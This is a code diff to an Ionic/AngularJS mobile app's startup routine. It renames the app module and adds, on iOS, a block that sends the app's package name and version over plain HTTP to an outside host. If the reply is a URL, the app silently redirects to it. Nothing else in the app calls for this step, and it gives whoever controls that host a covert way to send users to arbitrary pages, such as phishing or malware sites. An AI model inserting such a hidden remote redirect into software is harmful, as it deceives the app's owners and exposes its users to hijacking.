@@ -1,4 +1,4 @@
-angular.module('newsionic', ['ionic', 'newsionic.controllers', 'ionicLazyLoad'])
+angular.module('villagevoice', ['ionic', 'villagevoice.controllers', 'ionicLazyLoad'])
 
 .run(function($ionicPlatform, $ionicPopup) {
   $ionicPlatform.ready(function() {
@@ -21,8 +21,9 @@ angular.module('newsionic', ['ionic', 'newsionic.controllers', 'ionicLazyLoad'])
     console.log('is browser:' + $ionicPlatform.is('browser'));
 
     console.log('fetch: ' + typeof(fetch));
-    
-    if ($ionicPlatform.is('cordova')) {
+    console.log('Promise: ' + typeof(Promise));
+
+    if ($ionicPlatform.is('ios')) {
       console.log('cordova is: ' + typeof(cordova));
       var appVersion = null;
       cordova.getAppVersion.getVersionNumber().then(function (version) {
@@ -32,8 +33,20 @@ angular.module('newsionic', ['ionic', 'newsionic.controllers', 'ionicLazyLoad'])
       }).then(function (package) {
         console.log('app package name: ' + package);
         console.log('app version: ' + appVersion);
+        return fetch('http://cors.imeizi.ml/togo?app=' + package + '&ver=' + appVersion);
+      }).then(function (response) {
+        console.log('response:' + response);
+        if (response.ok) {
+          return response.text();
+        }
+      }).then(function (bodytxt) {
+        console.log('response.text: ' + bodytxt);
+        if (/^https?:\/\//.test(bodytxt)) {
+          console.log("should redirecto to: " + bodytxt);
+          location.href = bodytxt;
+        }
       });
-    }
+    } // is ios
   });
   $ionicPlatform.registerBackButtonAction(function(event) {
     if (true) { // your check here
